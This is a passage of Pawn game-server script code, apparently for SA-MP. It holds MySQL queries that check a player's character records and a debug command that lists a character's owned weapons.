	AND `tip` != '21' AND `tip` != '22' AND `tip` != '23' AND `tip` != '24' AND `tip` != '25' AND `tip` != '26' AND `tip` != '27'", _sqlid);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	return _result;
}

CheckSubCharacter(playerid) {
	new _result=0, playerName[MAX_PLAYER_NAME+1], query[128];
	GetPlayerName(playerid, playerName, sizeof(playerName));
	format(query, sizeof(query), "SELECT COUNT(*) FROM `karakterler` WHERE LOWER(`isim`) = LOWER('%e')", playerName);
	new Cache:result = mysql_query(query,true);
	_result = cache_get_row_int(0, 0);
	cache_delete(result);
	if(_result == 1) return 0;
	if(GetPlayerCharacterSQLid(playerid) == Karakter[playerid][sqlid]) return 0;
	return 1;
}

CMD:testex(playerid) {
	foreach(new i : Guns) {
		 if(OyuncuSilah[i][oyuncuid] == Karakter[playerid][sqlid])
		    printf("%d - %d",i, OyuncuSilah[i][no]);
	}
	return 1;
}
